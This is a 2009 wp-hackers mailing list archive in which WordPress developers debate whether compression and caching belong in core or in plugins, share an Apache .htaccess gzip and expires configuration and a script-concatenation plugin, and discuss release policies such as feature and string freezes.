In-Reply-To: <60C359174B6241E783E99EECC3A2EB6B@Asuh>
References: <9861424E-B8AB-4994-A475-4ABE7385A56D@automattic.com> 
	<F757D2872564421698C9096F7A252858@Asuh>
	<4cc4de140912262003o4b6c0608nfb95a9949b3518b4@mail.gmail.com> 
	<2C0D92D90D2E42D6BC94BD5B7B555292@Asuh> <op.u5kx0hw2spxmuu@dd32> 
	<6A411CFA7F4248A3A4611893FB9FBD5C@Asuh> <4B37BD9F.1010400@santosj.name>
	<60C359174B6241E783E99EECC3A2EB6B@Asuh>
Message-ID: <161617690912281319k3f0d3cecoeb45f899df47b9bc@mail.gmail.com>

On Mon, Dec 28, 2009 at 2:34 PM, Micah <wp at twolanedesign.com> wrote:
> So this is the root argument against integration into Wordpress. Not
> everyone does everything the same way and most people don't need to learn
> Apache in order to use compression when plugins are created for this
> purpose. I get it but I don't agree.
>
> Compression can't be turned on by default. Bad idea.

Actually, that's the correct way to do it. There's dozens of different
possible ways to optimize a site, should every single possible one of
them be integrated into the core as well?

Simple techniques like whole-page caching or server-side compression
don't fit every site. Not just because of bad things when you try to
use them inappropriately, but because there's lots of different ways
of doing them, and people who need these sorts of things can choose
from different solutions that fit their needs best.

When you put something in core, you tend to pre-empt it from the
plugin realm. Caching and compression don't need that sort of
pre-emption, they need variety.

> While I'm about to make a huge
> assumption, I think the majority of Wordpress installations are standard,
> shared server installations.

That's a MASSIVE assumption there, and probably a wrong one at that.

Also, most people installing on shared server installations are the
ones that *don't* need compression. Compression adds a heavy amount of
CPU load, which is your most limited factor on a shared host. Caching
can be useful on shared hosting, unless you're on some form of grid
hosting in which case file-caching to a network filesystem would cause
you to become much slower than normal.

You can't assume anything. That's sort of my point. All the things
you're advocating have downsides, and even those are in cases that are
commonplace.

> the rise of Wordpress as a CMS should put light on
> creating a better end user experience out of the box, not just with a lot of
> plugins.

Neither of these creates a better end user experience in 95% of the
cases. Compression doesn't magically make things faster. Compressing
things on-the-fly is slower than not compressing them half the time.

Compression saves your bandwidth.
Caching saves your CPU time.
Both together *can* make a site speedier, but **they usually don't**.
Not all the time, and not even a majority of the time. And there are
severe compatibility issues to contend with as well.

What I'm saying is that because things can go wrong, and will go
wrong, in a not insignificant number of cases, this is and should be
plugin material.

FWIW, I'm fairly sure that WordPress.com doesn't use whole-page
caching; every one of those 20,000 page requests they get every second
is generated dynamically. They do use memcached object caching (or
similar), as I recall hearing somewhere.

> Isn't maintaining the gotchas what already happens to WP Super Cache
> support? It seems logical that since the core developers can control all
> aspects of the hows and whats about caching a dynamic system, knowing how
> brilliant you people are already, I don't think this problem gets much worse
> in the core.

Actually, it gets a thousand times worse in the core. Object caching
was removed and made pluggable for that very reason.

> Compression will always make a file smaller. Smaller file sizes means less
> bandwidth. Less bandwidth means faster page loads. This isn't blanket
> statement.

Not only is that a blanket statement, it's a series of *wrong* ones.

Compression takes CPU time. CPU has to process instructions to
compress the data. While the data is being generated, browser is
waiting for data. Data cannot be transmitted until compression is
complete, as compression is not a streaming operation in most cases.
Thus, page takes *longer* to display.

This happens in about 35% of cases, depending on server load. If you
combine full page caching into the mix, then yes, you can achieve much
by eliminating the compression itself, at the cost of making your page
static instead of a dynamic page (a cost that many people don't want
to pay).

> Plugins are third-party to the core software. Including these techniques
> into the core takes away the middle man of having to use a plugin. I'm not
> against plugins, I just think root functionality that helps end user
> experience shouldn't be dismissed as plugin material.

First, understand that plugins are NOT slower. Quite the contrary, in
fact. Plugins can specialize. The core cannot. Specialized code is
often faster than generalized code, because it can afford to exclude a
percentage of the possible population.

Also, plugins are NOT middle-men. What exactly do you think the
difference is, technically, between a plugin and core code? Because
*there isn't any*. When WordPress loads, one of the first things it
does is to load the list of plugins and include them, one by one. You
know what it does to load other pieces of the WordPress core code? It
includes them.

WordPress plugins are loaded and executed in the exact same way as
every other file in the whole thing. Half of the internal "core"
functionality of WordPress even uses actions and filters in the same
way plugins do (see default-filters.php).

> I know Wordpress is already complicated as it is. Adding tons of plugins
> further complicates this CMS and add more requests to slow it dwn.

If you put those pieces in the core, then you get the exact same
slowdowns, only now you get them even if you *don't* use that piece of
code.

> In the
> end, the CMS is a more efficient, dynamic way to publish a website and the
> end user experience can be improved immediately with core compression and
> caching functionality.

I'm sorry, but you are simply mistaken. I'd be glad to further expound
upon why you're mistaken, but I'd prefer to do it off list. People get
cranky when I go on list with this sort of thing. You can email me
directly if you like at otto at ottodestruct.com and I'll be glad to
continue this part of the conversation.

-Otto

From william.canino at googlemail.com  Mon Dec 28 21:22:29 2009
From: william.canino at googlemail.com (William Canino)
Date: Mon, 28 Dec 2009 16:22:29 -0500
Subject: [wp-hackers] compression and caching
In-Reply-To: <c81652ed0912281001s51932805pcee8739d581998c8@mail.gmail.com>
References: <9861424E-B8AB-4994-A475-4ABE7385A56D@automattic.com>
	<F757D2872564421698C9096F7A252858@Asuh>
	<4cc4de140912262003o4b6c0608nfb95a9949b3518b4@mail.gmail.com>
	<2C0D92D90D2E42D6BC94BD5B7B555292@Asuh> <op.u5kx0hw2spxmuu@dd32>
	<6A411CFA7F4248A3A4611893FB9FBD5C@Asuh>
	<161617690912280639v28c8393aj59a02960e31a2b00@mail.gmail.com>
	<c81652ed0912281001s51932805pcee8739d581998c8@mail.gmail.com>
Message-ID: <e4dc67e0912281322s67b2e202w85f36a62b5f102ff@mail.gmail.com>

Let me share with you guys my .htaccess file. I got more gains with
this config in my experience than minifying and concatenating on the
fly hereby killing the CPU of my shared host.

# Far Expires
FileETag All
ExpiresActive On  # enable expirations
ExpiresByType text/javascript "access plus 5 weeks"
ExpiresByType application/x-javascript "access plus 5 weeks"
ExpiresByType application/javascript "access plus 5 weeks"
ExpiresByType text/css "access plus 5 weeks"

# Javascript and CSS Gzipping
# copied from http://zuble.blogspot.com/2007/02/compressed-js-and-modrewrite.html
<FilesMatch "\\.js.gz$">
  ForceType text/javascript
  Header set Content-Encoding: gzip
</FilesMatch>
<FilesMatch "\\.js$">
  RewriteEngine On
  RewriteCond %{HTTP:Accept-Encoding} gzip
  RewriteCond %{HTTP_USER_AGENT} !".*Safari.*"
  RewriteCond %{REQUEST_FILENAME}.gz -f
  RewriteRule (.*)\.js$ $1\.js.gz [L]
  ForceType text/javascript
</FilesMatch>
<FilesMatch "\\.css.gz$">
  ForceType text/css
  Header set Content-Encoding: gzip
</FilesMatch>
<FilesMatch "\\.css$">
  RewriteEngine On
  RewriteCond %{HTTP:Accept-Encoding} gzip
  RewriteCond %{HTTP_USER_AGENT} !".*Safari.*"
  RewriteCond %{REQUEST_FILENAME}.gz -f
  RewriteRule (.*)\.css$ $1\.css.gz [L]
  ForceType text/css
</FilesMatch>

I then saved a minified+gzipped version of each css and js on the
respective directories.

Don't joke -- I *have* killed a shared hosting CPU before by
dynamically concatenating, minifying and compressing assets.

From william.canino at googlemail.com  Mon Dec 28 21:35:20 2009
From: william.canino at googlemail.com (William Canino)
Date: Mon, 28 Dec 2009 16:35:20 -0500
Subject: [wp-hackers] compression and caching
In-Reply-To: <161617690912281319k3f0d3cecoeb45f899df47b9bc@mail.gmail.com>
References: <9861424E-B8AB-4994-A475-4ABE7385A56D@automattic.com>
	<F757D2872564421698C9096F7A252858@Asuh>
	<4cc4de140912262003o4b6c0608nfb95a9949b3518b4@mail.gmail.com>
	<2C0D92D90D2E42D6BC94BD5B7B555292@Asuh> <op.u5kx0hw2spxmuu@dd32>
	<6A411CFA7F4248A3A4611893FB9FBD5C@Asuh>
	<4B37BD9F.1010400@santosj.name>
	<60C359174B6241E783E99EECC3A2EB6B@Asuh>
	<161617690912281319k3f0d3cecoeb45f899df47b9bc@mail.gmail.com>
Message-ID: <e4dc67e0912281335x51090262o6b22063fc25463d4@mail.gmail.com>

> Also, most people installing on shared server installations are the
> ones that *don't* need compression. Compression adds a heavy amount of
> CPU load, which is your most limited factor on a shared host.

+1

One of my sites got booted off byethost.com because it consumed its
entire monthly CPU allotment in 12 hours -- PHP-level minifying and
gzipping on-the-fly as it did.

W



2009/12/28 Otto <otto at ottodestruct.com>:
> On Mon, Dec 28, 2009 at 2:34 PM, Micah <wp at twolanedesign.com> wrote:
>> So this is the root argument against integration into Wordpress. Not
>> everyone does everything the same way and most people don't need to learn
>> Apache in order to use compression when plugins are created for this
>> purpose. I get it but I don't agree.
>>
>> Compression can't be turned on by default. Bad idea.
>
> Actually, that's the correct way to do it. There's dozens of different
> possible ways to optimize a site, should every single possible one of
> them be integrated into the core as well?
>
> Simple techniques like whole-page caching or server-side compression
> don't fit every site. Not just because of bad things when you try to
> use them inappropriately, but because there's lots of different ways
> of doing them, and people who need these sorts of things can choose
> from different solutions that fit their needs best.
>
> When you put something in core, you tend to pre-empt it from the
> plugin realm. Caching and compression don't need that sort of
> pre-emption, they need variety.
>
>> While I'm about to make a huge
>> assumption, I think the majority of Wordpress installations are standard,
>> shared server installations.
>
> That's a MASSIVE assumption there, and probably a wrong one at that.
>
> Also, most people installing on shared server installations are the
> ones that *don't* need compression. Compression adds a heavy amount of
> CPU load, which is your most limited factor on a shared host. Caching
> can be useful on shared hosting, unless you're on some form of grid
> hosting in which case file-caching to a network filesystem would cause
> you to become much slower than normal.
>
> You can't assume anything. That's sort of my point. All the things
> you're advocating have downsides, and even those are in cases that are
> commonplace.
>
>> the rise of Wordpress as a CMS should put light on
>> creating a better end user experience out of the box, not just with a lot of
>> plugins.
>
> Neither of these creates a better end user experience in 95% of the
> cases. Compression doesn't magically make things faster. Compressing
> things on-the-fly is slower than not compressing them half the time.
>
> Compression saves your bandwidth.
> Caching saves your CPU time.
> Both together *can* make a site speedier, but **they usually don't**.
> Not all the time, and not even a majority of the time. And there are
> severe compatibility issues to contend with as well.
>
> What I'm saying is that because things can go wrong, and will go
> wrong, in a not insignificant number of cases, this is and should be
> plugin material.
>
> FWIW, I'm fairly sure that WordPress.com doesn't use whole-page
> caching; every one of those 20,000 page requests they get every second
> is generated dynamically. They do use memcached object caching (or
> similar), as I recall hearing somewhere.
>
>> Isn't maintaining the gotchas what already happens to WP Super Cache
>> support? It seems logical that since the core developers can control all
>> aspects of the hows and whats about caching a dynamic system, knowing how
>> brilliant you people are already, I don't think this problem gets much worse
>> in the core.
>
> Actually, it gets a thousand times worse in the core. Object caching
> was removed and made pluggable for that very reason.
>
>> Compression will always make a file smaller. Smaller file sizes means less
>> bandwidth. Less bandwidth means faster page loads. This isn't blanket
>> statement.
>
> Not only is that a blanket statement, it's a series of *wrong* ones.
>
> Compression takes CPU time. CPU has to process instructions to
> compress the data. While the data is being generated, browser is
> waiting for data. Data cannot be transmitted until compression is
> complete, as compression is not a streaming operation in most cases.
> Thus, page takes *longer* to display.
>
> This happens in about 35% of cases, depending on server load. If you
> combine full page caching into the mix, then yes, you can achieve much
> by eliminating the compression itself, at the cost of making your page
> static instead of a dynamic page (a cost that many people don't want
> to pay).
>
>> Plugins are third-party to the core software. Including these techniques
>> into the core takes away the middle man of having to use a plugin. I'm not
>> against plugins, I just think root functionality that helps end user
>> experience shouldn't be dismissed as plugin material.
>
> First, understand that plugins are NOT slower. Quite the contrary, in
> fact. Plugins can specialize. The core cannot. Specialized code is
> often faster than generalized code, because it can afford to exclude a
> percentage of the possible population.
>
> Also, plugins are NOT middle-men. What exactly do you think the
> difference is, technically, between a plugin and core code? Because
> *there isn't any*. When WordPress loads, one of the first things it
> does is to load the list of plugins and include them, one by one. You
> know what it does to load other pieces of the WordPress core code? It
> includes them.
>
> WordPress plugins are loaded and executed in the exact same way as
> every other file in the whole thing. Half of the internal "core"
> functionality of WordPress even uses actions and filters in the same
> way plugins do (see default-filters.php).
>
>> I know Wordpress is already complicated as it is. Adding tons of plugins
>> further complicates this CMS and add more requests to slow it dwn.
>
> If you put those pieces in the core, then you get the exact same
> slowdowns, only now you get them even if you *don't* use that piece of
> code.
>
>> In the
>> end, the CMS is a more efficient, dynamic way to publish a website and the
>> end user experience can be improved immediately with core compression and
>> caching functionality.
>
> I'm sorry, but you are simply mistaken. I'd be glad to further expound
> upon why you're mistaken, but I'd prefer to do it off list. People get
> cranky when I go on list with this sort of thing. You can email me
> directly if you like at otto at ottodestruct.com and I'll be glad to
> continue this part of the conversation.
>
> -Otto
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From scribu at gmail.com  Mon Dec 28 22:24:40 2009
From: scribu at gmail.com (scribu)
Date: Tue, 29 Dec 2009 00:24:40 +0200
Subject: [wp-hackers] compression and caching
In-Reply-To: <e4dc67e0912281335x51090262o6b22063fc25463d4@mail.gmail.com>
References: <9861424E-B8AB-4994-A475-4ABE7385A56D@automattic.com>
	<F757D2872564421698C9096F7A252858@Asuh>
	<4cc4de140912262003o4b6c0608nfb95a9949b3518b4@mail.gmail.com>
	<2C0D92D90D2E42D6BC94BD5B7B555292@Asuh> <op.u5kx0hw2spxmuu@dd32>
	<6A411CFA7F4248A3A4611893FB9FBD5C@Asuh>
	<4B37BD9F.1010400@santosj.name>
	<60C359174B6241E783E99EECC3A2EB6B@Asuh>
	<161617690912281319k3f0d3cecoeb45f899df47b9bc@mail.gmail.com>
	<e4dc67e0912281335x51090262o6b22063fc25463d4@mail.gmail.com>
Message-ID: <349fe48b0912281424v1775d69s6e95c8697a6c5d27@mail.gmail.com>

I think Otto made an excelent (and extensive) case for why caching shouldn't
be part of Core. Agree 100%.

I wonder if either WP Super Cache or W3 Total Cache will be a canonical
plugin or not.


-- 
http://scribu.net

From wp at twolanedesign.com  Mon Dec 28 23:08:03 2009
From: wp at twolanedesign.com (Micah)
Date: Mon, 28 Dec 2009 15:08:03 -0800
Subject: [wp-hackers] compression and caching
In-Reply-To: <349fe48b0912281424v1775d69s6e95c8697a6c5d27@mail.gmail.com>
References: <9861424E-B8AB-4994-A475-4ABE7385A56D@automattic.com><F757D2872564421698C9096F7A252858@Asuh><4cc4de140912262003o4b6c0608nfb95a9949b3518b4@mail.gmail.com><2C0D92D90D2E42D6BC94BD5B7B555292@Asuh>
	<op.u5kx0hw2spxmuu@dd32><6A411CFA7F4248A3A4611893FB9FBD5C@Asuh><4B37BD9F.1010400@santosj.name><60C359174B6241E783E99EECC3A2EB6B@Asuh><161617690912281319k3f0d3cecoeb45f899df47b9bc@mail.gmail.com><e4dc67e0912281335x51090262o6b22063fc25463d4@mail.gmail.com>
	<349fe48b0912281424v1775d69s6e95c8697a6c5d27@mail.gmail.com>
Message-ID: <DA0789891F2445F39A328C68D759CCA0@Asuh>

>I think Otto made an excelent (and extensive) case for why caching 
>shouldn't
> be part of Core. Agree 100%.

For now, I'm gonna approach Otto directly about this. While I understand the 
case against caching in the core, I believe there's a strong case for many 
optimization methods in the core. This makes it easier for developers to 
optimize their sites and all plugins will have access to optimization 
resources.

> I wonder if either WP Super Cache or W3 Total Cache will be a canonical
> plugin or not.

Let's hope so! 


From westonruter at gmail.com  Tue Dec 29 04:49:15 2009
From: westonruter at gmail.com (Weston Ruter)
Date: Mon, 28 Dec 2009 20:49:15 -0800
Subject: [wp-hackers] compression and caching
Message-ID: <fb8299e10912282049h16b7442dr3b0d926348ab32ef@mail.gmail.com>

Hi all, I'm new here. Micah invited me to join in on the discussion.

I just read most of the messages in this thread, and I see most of them are
debating the merits of compressing (gzipping) responses. Regarding scripts
alone, just concatenating the enqueued scripts and minifying them will
result in drastic speedups without gzipping at all. For example, I recently
a WordPress site built by a reputable company that had 50(!) external
JavaScript files. If these were all concatenated together and
minified/optimized, then there would potentially be only one download. As an
added bonus, this optimized script could be gzipped and even more
importantly be served with a far-future expires header.

I have been developing a plugin called ?Optimize Scripts? which does just
this. As the plugin page states, it:

   1. Respects head and footer groups.
   2. Minifies code using Google's Closure Compiler.
   3. Caches the concatenated/minified code and rebuilds it only when one of
   its source scripts expires or changes. The optimizescripts_expires filter
   is provided which allows the far-future expires time to be forced.
   4. Filename for concatenated/minified script is the md5 of all the
   handles concatenated together (thus if an additional handle is provided, a
   new concatenated script is generated).
   5. Provides a filter to limit which scripts get concatenated (i.e. jQuery
   on ajax.googleapis.com should be left alone); by default, all scripts on
   local host are concatenated, and remote scripts are left alone.
   6. Removes the default 'ver' query parameter which WordPress adds to
   every script src if no version argument is supplied on
   wp_enqueue/register_script: this is important for Web-wide caching of
   scripts loaded from ajax.googleapis.com, for example. When registering
   new scripts, pass the filemtime in as the version so that whenever a file
   changes, the concatenated script will be regenerated.
   7. Script optimization can be delegated to a scheduled cron job so that
   the server does not periodically respond slowly to visitors.

Read more and see examples on the plugin page:
http://wordpress.org/extend/plugins/optimize-scripts/

This plugin also relies on server configuration in that a far-future expires
header must be set, or otherwise the plugin will abort concatenation.
(However, the optimizescripts_expires filter mentioned above is a workaround
for this.)

I'm eager to hear what you all think about this approach and if would be
good to include in WordPress core so that it can be fast by default in how
it serves scripts.

Weston


*William Canino* wrote at *Mon Dec 28 21:22:29 UTC 2009*:

> Let me share with you guys my .htaccess file. I got more gains with
>
> this config in my experience than minifying and concatenating on the
> fly hereby killing the CPU of my shared host.
>
> # Far Expires
> FileETag All
> ExpiresActive On  # enable expirations
> ExpiresByType text/javascript "access plus 5 weeks"
>
>
> ExpiresByType application/x-javascript "access plus 5 weeks"
> ExpiresByType application/javascript "access plus 5 weeks"
> ExpiresByType text/css "access plus 5 weeks"
>
> # Javascript and CSS Gzipping
>
>
> # copied from http://zuble.blogspot.com/2007/02/compressed-js-and-modrewrite.html
> <FilesMatch "\\.js.gz$">
>
>   ForceType text/javascript
>
>   Header set Content-Encoding: gzip
> </FilesMatch>
> <FilesMatch "\\.js$">
>   RewriteEngine On
>   RewriteCond %{HTTP:Accept-Encoding} gzip
>   RewriteCond %{HTTP_USER_AGENT} !".*Safari.*"
>
>
>   RewriteCond %{REQUEST_FILENAME}.gz -f
>   RewriteRule (.*)\.js$ $1\.js.gz [L]
>   ForceType text/javascript
> </FilesMatch>
> <FilesMatch "\\.css.gz$">
>   ForceType text/css
>   Header set Content-Encoding: gzip
>
>
> </FilesMatch>
> <FilesMatch "\\.css$">
>   RewriteEngine On
>   RewriteCond %{HTTP:Accept-Encoding} gzip
>   RewriteCond %{HTTP_USER_AGENT} !".*Safari.*"
>   RewriteCond %{REQUEST_FILENAME}.gz -f
>
>
>   RewriteRule (.*)\.css$ $1\.css.gz [L]
>   ForceType text/css
> </FilesMatch>
>
> I then saved a minified+gzipped version of each css and js on the
> respective directories.
>
> Don't joke -- I *have* killed a shared hosting CPU before by
>
>
> dynamically concatenating, minifying and compressing assets.
>
>

From wordpress at dd32.id.au  Tue Dec 29 07:36:37 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Tue, 29 Dec 2009 18:36:37 +1100
Subject: [wp-hackers] Improving WordPress Core Development
In-Reply-To: <8443cbbb0912281231y1ee7f473n7c5b840d3fe26eba@mail.gmail.com>
References: <8443cbbb0912281231y1ee7f473n7c5b840d3fe26eba@mail.gmail.com>
Message-ID: <op.u5ovfbfsspxmuu@dd32>

On Tue, 29 Dec 2009 07:31:46 +1100, Dan Cole <wp at dan-cole.com> wrote:
> <snip>

Sounds good to me, Here's my long brainstorm of some changes which could  
be useful.
Please note, That when i say a clear policy, I mainly mean a published  
document somewhere redibly accessable by users that explains it all. I  
also do not intend to attack anyone personally, if something i mention  
sounds like something you may have done, Do not take it as an arguement,  
Its mainly my opinion of how i'd like to see things happen.

I'd like to preface it by saying that WordPress in general seems to be  
staying pretty open about whats happening, although i agree that sometimes  
theres a bit of a "so and so said this was coming in 3.0!" etc sort of  
item before theres even been a meeting to decide.. but sometimse  
developers will get behind something and do it, knowing its in the end  
users best interests, you have to trust them sometimes :) - Make sure you  
read the Setting Scope blog post however before anyone comments on that  
statement please.


I see a few things that WordPress needs:
  * A clear policy on what types of patches goes into what release,  
specifically, point releases -  
http://westi.wordpress.com/2009/12/19/what-should-go-into-a-wordpress-maintenance-release/
  * A clear policy on when the last enhancement ticket gets commited  
(Feature Frozen)
    * Would prefer that hook-aditions are exempt from this, As its when  
plugin developers are testing they realise where an extra hook would be  
good - Hook additions only (no new refactoring or lots of code changing  
for it to happen)
  * A clear policy on beta/RC timeframes, Ie. Once feature frozen, 2 weeks  
later, beta1.
   * This is not as easy, as it highly depends on what functions are being  
worked on. So no hard limit, just a general published example of "2-3  
weeks between feature frozen and beta1, approximately 1-2 weeks between  
subsequent betas, RC's when closing in on release"
  * A clear policy on the release, Ideally, My preference would be that the  
last RC must be in the wild for at least 2-3 days, with no further commits  
before release
    * If a commit is required, next RC and repeat this step

Trac:
  * A clear policy documenting how patches must be tested
   * Edge cases need to be checked, not just that the PHP executes.
   * Its obviously, impossible that every patch will not introduce a bug,  
and its not always possible to explain in depth the ways in which  
something has been tested.
  * What "Feature requests" should be discussed.
   * Its my opinion, That no feature request should ever be opened on trac  
first, should be brought up on wp-hackers or the support forums first (Or  
another location with lots of WP'ers. or Unless it has been put past a  
core developer who strongly supports it)
  * Respect & proper use of trac keywords
   * Most people dont have a problem with this, But for example, marking a  
bug as tested without properly testing (Or posting how it was tested) or  
setting other keywords which some developers use
    * For example, The 'early' keyword used to keep track of a punted  
ticket from a dev. Normal users should use 'commit' to add it to the  
Commit Candidates list
   * Denis's new trac reports based on the keywords are great, and they  
rely on the keywords, so having these set properly greatly increases  
efficiency.
  * Potentially a better Component list.
   * Bugs might surface in say the Template system, but its actualy the  
Taxonomy system thats the problem
   * Bugs affect multiple locations.. a multi-select heirachial list could  
be better, Would help seperate Plugin Upgrade issues from Database Upgrade  
issues for example.

More In general:
  * I think people need to realise when they're solution is not best, I am  
myself guilty of this, and so have many others. I've seen too many people  
flood trac/wp-hackers without reconising what could potentially be their  
mis-understanding of a problem, the suggestion, or to be fair, sometimes  
may not have a indepth knowledge of the issue to understand the effects of  
it
   * So i ask people to think of that next time in an arguement, try to  
keep your mind open, Even if it goes against every bone in your body to  
even consider the other approach, it pays off to at least look it over.


Some of these items are already done, some people may not realise it  
however, having them displayed more prominently may help with that..



-- 
Dion Hulse / dd32

Contact:
  e: contact at dd32.id.au
  msn: msn at d32.id.au
  skype: theonly_dd32
Web: http://dd32.id.au/

From koke at amedias.org  Tue Dec 29 07:42:44 2009
From: koke at amedias.org (Jorge Bernal)
Date: Tue, 29 Dec 2009 08:42:44 +0100
Subject: [wp-hackers] Improving WordPress Core Development
In-Reply-To: <op.u5ovfbfsspxmuu@dd32>
References: <8443cbbb0912281231y1ee7f473n7c5b840d3fe26eba@mail.gmail.com>
	<op.u5ovfbfsspxmuu@dd32>
Message-ID: <B3D8DA6A-6B9D-41B3-AFC7-2DB3EFD639FA@amedias.org>


On Dec 29, 2009, at 8:36 AM, Dion Hulse (dd32) wrote:

> 
> I see a few things that WordPress needs:
> * A clear policy on what types of patches goes into what release, specifically, point releases - http://westi.wordpress.com/2009/12/19/what-should-go-into-a-wordpress-maintenance-release/
> * A clear policy on when the last enhancement ticket gets commited (Feature Frozen)

To add a bit on the "Feature Freeze", is quite common in other open source projects to have a "String Freeze" (no user visible strings change), so translators can do their job before the final release

--
Jorge Bernal Ordov?s - Webmaster
<jbernal at ebox-technologies.com>
eBox Technologies         http://www.ebox-technologies.com/

http://www.jorgebernal.info/









From wordpress at dd32.id.au  Tue Dec 29 07:47:25 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Tue, 29 Dec 2009 18:47:25 +1100
Subject: [wp-hackers] Improving WordPress Core Development
In-Reply-To: <B3D8DA6A-6B9D-41B3-AFC7-2DB3EFD639FA@amedias.org>
References: <8443cbbb0912281231y1ee7f473n7c5b840d3fe26eba@mail.gmail.com>
	<op.u5ovfbfsspxmuu@dd32>
	<B3D8DA6A-6B9D-41B3-AFC7-2DB3EFD639FA@amedias.org>
Message-ID: <op.u5ovxbsrspxmuu@dd32>

On Tue, 29 Dec 2009 18:42:44 +1100, Jorge Bernal <koke at amedias.org> wrote:

>
> On Dec 29, 2009, at 8:36 AM, Dion Hulse (dd32) wrote:
>
>>
>> I see a few things that WordPress needs:
>> * A clear policy on what types of patches goes into what release,  
>> specifically, point releases -  
>> http://westi.wordpress.com/2009/12/19/what-should-go-into-a-wordpress-maintenance-release/
>> * A clear policy on when the last enhancement ticket gets commited  
>> (Feature Frozen)
>
> To add a bit on the "Feature Freeze", is quite common in other open  
> source projects to have a "String Freeze" (no user visible strings  
> change), so translators can do their job before the final release

WordPress does do a string freeze, usually its a week or 2 before release.  
Some changes are absolutely needed however, so its mainly a case of really  
avoid changing the string unless its absolutely needed. Mentioning that  
along with the rest would be good though, like i said, Some of it takes  
place, its just not published that a general "spec" is being followed.

From peter.westwood at ftwr.co.uk  Tue Dec 29 08:28:56 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Tue, 29 Dec 2009 08:28:56 +0000
Subject: [wp-hackers] Improving WordPress Core Development
In-Reply-To: <op.u5ovxbsrspxmuu@dd32>
References: <8443cbbb0912281231y1ee7f473n7c5b840d3fe26eba@mail.gmail.com>
	<op.u5ovfbfsspxmuu@dd32>
	<B3D8DA6A-6B9D-41B3-AFC7-2DB3EFD639FA@amedias.org>
	<op.u5ovxbsrspxmuu@dd32>
Message-ID: <BAB55B6D-016E-429C-96A8-A7BDD27CBE88@ftwr.co.uk>


On 29 Dec 2009, at 07:47, Dion Hulse (dd32) wrote:

> On Tue, 29 Dec 2009 18:42:44 +1100, Jorge Bernal <koke at amedias.org>  
> wrote:
>
>>
>> On Dec 29, 2009, at 8:36 AM, Dion Hulse (dd32) wrote:
>>
>>>
>>> I see a few things that WordPress needs:
>>> * A clear policy on what types of patches goes into what release,  
>>> specifically, point releases - http://westi.wordpress.com/2009/12/19/what-should-go-into-a-wordpress-maintenance-release/
>>> * A clear policy on when the last enhancement ticket gets commited  
>>> (Feature Frozen)
>>
>> To add a bit on the "Feature Freeze", is quite common in other open  
>> source projects to have a "String Freeze" (no user visible strings  
>> change), so translators can do their job before the final release
>
> WordPress does do a string freeze, usually its a week or 2 before  
> release. Some changes are absolutely needed however, so its mainly a  
> case of really avoid changing the string unless its absolutely  
> needed. Mentioning that along with the rest would be good though,  
> like i said, Some of it takes place, its just not published that a  
> general "spec" is being followed.
>

Indeed.

Unfortunately for 2.9 we had to change more strings that we would have  
liked after the String Freeze.

I did try and keep the translation teams in the loop and once the  
changes had settled again let them know of the differences between the  
frozen version and the release candidate.

Cheers

Peter
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From peter.westwood at ftwr.co.uk  Tue Dec 29 08:43:31 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Tue, 29 Dec 2009 08:43:31 +0000
Subject: [wp-hackers] compression and caching
In-Reply-To: <fb8299e10912282049h16b7442dr3b0d926348ab32ef@mail.gmail.com>
References: <fb8299e10912282049h16b7442dr3b0d926348ab32ef@mail.gmail.com>
Message-ID: <82B2FD0F-A743-4B38-82FA-79C41F6DED93@ftwr.co.uk>


On 29 Dec 2009, at 04:49, Weston Ruter wrote:

> I just read most of the messages in this thread, and I see most of  
> them are
> debating the merits of compressing (gzipping) responses. Regarding  
> scripts
> alone, just concatenating the enqueued scripts and minifying them will
> result in drastic speedups without gzipping at all. For example, I  
> recently
> a WordPress site built by a reputable company that had 50(!) external
> JavaScript files. If these were all concatenated together and
> minified/optimized, then there would potentially be only one  
> download. As an
> added bonus, this optimized script could be gzipped and even more
> importantly be served with a far-future expires header.
>

This sounds like very good site specific optimisation that a plugin  
can provide and hilights that a plugin /can/ provide it.

However, it is very easy to create a solution which optimises the  
performance of one site but actually ruins the performance of another.

I am also unconvinced about the concatenation of script files on the  
front end of a site.

If you have different js requirements for different pages you either  
have to send the whole lot to all of them (thereby sending more than  
you would have done before) or end up sending different 'packs' for  
different pages and then you will end up sending the same js twice to  
some users.

<SNIP>
>   6. Removes the default 'ver' query parameter which WordPress adds to
>   every script src if no version argument is supplied on
>   wp_enqueue/register_script: this is important for Web-wide caching  
> of
>   scripts loaded from ajax.googleapis.com, for example. When  
> registering
>   new scripts, pass the filemtime in as the version so that whenever  
> a file
>   changes, the concatenated script will be regenerated.

This issue of ver being included even when not supplied will not be  
avoidable using the core in 3.0 following on from the fix of this  
ticket - http://core.trac.wordpress.org/ticket/11315

> This plugin also relies on server configuration in that a far-future  
> expires
> header must be set, or otherwise the plugin will abort concatenation.
> (However, the optimizescripts_expires filter mentioned above is a  
> workaround
> for this.)
>
> I'm eager to hear what you all think about this approach and if  
> would be
> good to include in WordPress core so that it can be fast by default  
> in how
> it serves scripts.

I don't think this is something that we should be including in the  
core in the short term.

I do think that there is the potential for a canonical/core plugin  
which fulfils this use-case for those people that need it .

It would be great for all the different plugin developers in this  
space to combine there skills and ideas and come up with one plugin  
which works in all the different environments WordPress does.

-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From kikizas at gmail.com  Tue Dec 29 11:17:27 2009
From: kikizas at gmail.com (Demetris)
Date: Tue, 29 Dec 2009 13:17:27 +0200
Subject: [wp-hackers] compression and caching
In-Reply-To: <82B2FD0F-A743-4B38-82FA-79C41F6DED93@ftwr.co.uk>
References: <fb8299e10912282049h16b7442dr3b0d926348ab32ef@mail.gmail.com>
	<82B2FD0F-A743-4B38-82FA-79C41F6DED93@ftwr.co.uk>
Message-ID: <9f34a3610912290317t45665d1ek515820ec0222ec34@mail.gmail.com>

On Tue, Dec 29, 2009 at 10:43 AM, Peter Westwood
<peter.westwood at ftwr.co.uk> wrote:
>
> On 29 Dec 2009, at 04:49, Weston Ruter wrote:
>
> SNIP
>>
>> ?6. Removes the default 'ver' query parameter which WordPress adds to
>> ?every script src if no version argument is supplied on
